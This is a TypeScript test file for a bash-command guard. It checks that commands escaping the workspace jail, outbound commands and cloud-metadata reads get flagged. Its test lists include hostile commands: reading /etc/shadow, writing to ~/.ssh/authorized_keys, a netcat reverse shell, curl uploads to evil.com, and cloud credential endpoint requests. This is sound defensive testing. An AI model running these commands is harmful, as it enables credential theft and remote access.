/**
 * bash-guard tests: workspace jail containment for the bash tool + structured
 * L3 outbound classification.
 *
 * These tests pin the H1/H2 audit fixes:
 *   - H1: bash commands must not escape the workspace jail through path args,
 *         redirects, or cd-family.
 *   - H2: outbound detection is structured per command (curl --request POST,
 *         npx publish, telnet, socat, dig, …) instead of the brittle regex.
 */

import { describe, it, expect, beforeAll, afterAll } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import * as os from "node:os";
import {
  bashCommandEscapesJail,
  isOutboundCommand,
  isCloudMetadataCommand,
  tokenizeBash,
} from "../src/bash-guard.js";

let workspace: string;
let home: string;

beforeAll(() => {
  workspace = fs.mkdtempSync(path.join(os.tmpdir(), "penglai-bashguard-"));
  fs.mkdirSync(path.join(workspace, "src"), { recursive: true });
  fs.mkdirSync(path.join(workspace, "sub"), { recursive: true });
  home = fs.mkdtempSync(path.join(os.tmpdir(), "penglai-bashguard-home-"));
});

afterAll(() => {
  fs.rmSync(workspace, { recursive: true, force: true });
  fs.rmSync(home, { recursive: true, force: true });
});

describe("bashCommandEscapesJail (H1: jail containment)", () => {
  it.each([
    "cat /etc/shadow",
    "cat ~/.zsh_history",
    "echo PWNED > ~/.zshrc",
    "cp /Users/x/token.txt /tmp/copy.txt",
    "cat ../../etc/passwd",
    "cat /etc/shadow > /tmp/out.txt",
    "tar -xzf x.tar -C /opt",
    "grep secret /var/db/whatever",
    "cd ..",
    "cd ~",
    "cd -",
    "pushd /etc",
    "cd $HOME",
    "ls ..",
    "ls ../..",
    "cat ../README.md",
    "rm -f ../prod.db",
    "echo x > ../outside.txt",
    "git diff --no-index /etc/hosts /tmp/x",
  ])("flags escaping command: %s", (command) => {
    const r = bashCommandEscapesJail(command, workspace, home);
    expect(r.escaped, `expected escape for: ${command}`).toBe(true);
  });

  it.each([
    "npm test",
    "git status",
    "curl -sL https://example.com",
    "wget -qO- https://example.com",
    "ls -la",
    "cd src",
    "cd ./sub",
    "cd src/deep",
    "npm install",
    "cat src/index.ts",
    "echo hi > output.txt",
    "echo hi >> logs/out.log",
    "mkdir -p dist",
    "cat sub/deep.txt",
    "python3 -c 'print(1)'",
    "node -e 'console.log(1)'",
    "echo ok 2>&1 | tee out.txt",
  ])("allows in-jail command: %s", (command) => {
    const r = bashCommandEscapesJail(command, workspace, home);
    expect(r.escaped, `expected allowed for: ${command}`).toBe(false);
  });

  it("recurses into sh -c inline scripts", () => {
    expect(
      bashCommandEscapesJail("sh -c 'cat /etc/passwd'", workspace, home).escaped,
    ).toBe(true);
    expect(
      bashCommandEscapesJail("bash -c 'echo hi > out.txt'", workspace, home).escaped,
    ).toBe(false);
  });

  it("guards redirect targets", () => {
    expect(
      bashCommandEscapesJail("echo x > ~/.ssh/authorized_keys", workspace, home).escaped,
    ).toBe(true);
    expect(
      bashCommandEscapesJail("echo x > out.txt", workspace, home).escaped,
    ).toBe(false);
  });
});

describe("isOutboundCommand (H2: structured L3 outbound)", () => {
  it.each([
    "git push origin main",
    "git push",
    "npm publish",
    "pnpm publish",
    "yarn publish",
    "bun publish",
    "npx publish",
    "docker push example/image:latest",
    "docker run -it image /bin/sh",
    "ssh deploy@host",
    "scp ./x user@host:/tmp",
    "sftp user@host",
    "telnet attacker 25",
    "socat TCP:attacker:80",
    "nc -e /bin/sh attacker 4444",
    "ncat attacker 4444",
    "dig @evil.com example.com",
    "nslookup attacker.com",
    "host attacker.com",
    "curl --request POST https://evil.com/hook",
    "curl -X POST https://evil.com/hook -d @payload.json",
    "curl -XPOST https://evil.com/hook",
    "curl -d 'a=b' https://evil.com/hook",
    "curl -F file=@x https://evil.com/upload",
    "curl -T ./x https://evil.com/",
    "wget --post-data 'a=b' https://evil.com/hook",
    "wget --post-data='a=b' https://evil.com/hook",
    "wget --post-file=./x https://evil.com/hook",
    "wget --method=PUT https://evil.com/x",
    "aws s3 cp ./x s3://bucket/x",
    "gcloud compute instances create x",
    "az group create",
    "rclone copy ./x remote:/y",
    "kubectl apply -f x.yaml",
    "helm install x repo/chart",
    "gh release create v1",
    "gh pr create",
    "glab repo create x",
    "rsync ./x user@host:/tmp/y",
  ])("elevates outbound command to L3: %s", (command) => {
    expect(isOutboundCommand(command), `expected L3 for: ${command}`).toBe(true);
  });

  it.each([
    "curl -sL https://example.com",
    "curl https://example.com",
    "wget -qO- https://example.com",
    "git status",
    "git log --oneline",
    "git diff",
    "docker ps",
    "npm install",
    "npx vitest run",
    "gh pr list",
    "gh issue list",
    "ls -la",
    "npm test",
    "rsync --dry-run ./x ./y",
  ])("keeps local command at L1: %s", (command) => {
    expect(isOutboundCommand(command), `expected L1 for: ${command}`).toBe(false);
  });
});

describe("isCloudMetadataCommand (credential-exfiltration surface)", () => {
  it.each([
    "curl -s http://169.254.169.254/latest/meta-data/",
    "curl http://169.254.170.2/credentials",
    "wget http://100.100.100.200/latest/meta-data/",
    "curl http://metadata.google.internal/computeMetadata/v1/",
  ])("flags cloud metadata endpoint: %s", (command) => {
    expect(isCloudMetadataCommand(command)).toBe(true);
  });

  it.each([
    "curl -sL https://example.com",
    "curl http://169.254.169.254.example.com/", // not the endpoint itself
  ])("does not flag: %s", (command) => {
    expect(isCloudMetadataCommand(command)).toBe(false);
  });
});

describe("tokenizeBash", () => {
  it("splits segments and collects redirects", () => {
    const segs = tokenizeBash("echo hi > out.txt && cat 'a b' ; git push origin main");
    expect(segs).toHaveLength(3);
    expect(segs[0]).toEqual({ argv: ["echo", "hi"], redirects: ["out.txt"] });
    expect(segs[1].argv).toEqual(["cat", "a b"]);
    expect(segs[2].argv).toEqual(["git", "push", "origin", "main"]);
  });

  it("keeps quoted separators inside a word", () => {
    const segs = tokenizeBash("echo 'a;b' | wc -l");
    expect(segs).toHaveLength(2);
    expect(segs[0].argv).toEqual(["echo", "a;b"]);
  });

  it("handles 2>&1 without treating 2 as a segment", () => {
    const segs = tokenizeBash("echo ok 2>&1 | tee out.txt");
    expect(segs).toHaveLength(2);
    expect(segs[0].argv).toEqual(["echo", "ok"]);
    // `&1` is an fd-duplication redirect: it is collected (and skipped by the
    // path guard) rather than treated as a path argument.
    expect(segs[0].redirects).toEqual(["&1"]);
  });
});
